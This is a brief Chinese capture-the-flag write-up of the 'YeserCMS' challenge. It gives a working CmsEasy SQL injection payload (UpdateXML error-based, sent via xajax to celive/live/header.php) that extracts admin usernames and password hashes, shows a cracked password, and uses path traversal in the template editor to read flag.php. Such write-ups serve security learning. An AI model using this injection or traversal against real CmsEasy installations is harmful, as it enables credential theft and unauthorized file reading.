
# YeserCMS

* 根据评论里的图片得到网站cms信息，为easycms
> post发送数据到http://0767e6237f134c9f8269fba652766da133a60f2cc9884db5.changame.ichunqiu.com//celive/live/header.php  
> xajax=Postdata&xajaxargs[0]=<xjxquery><q>detail=xxxxxx',
  (UpdateXML(1,CONCAT(0x5b,mid((SELECT/**/GROUP_CONCAT(concat(username,'|',password))
   from cmseasy_user),1,32),0x5d),1)),NULL,NULL,NULL,NULL,NULL,NULL)-- </q></xjxquery>


* 获取到md5加密后的密码
> ff512d4240cbbdeafada404677ccbe61  
> Yeser231
* 登录后台， 进入管理界面->模板->当前模板编辑
> 发现模板数据改不掉，查看接口发现可能每次查看都重新访问文件，  那么我们通过修改request里的参数就可以直接读取falg.php里的信息了。
> 把id参数分别尝试 falg.php , ../flag.php , ../../flag.php


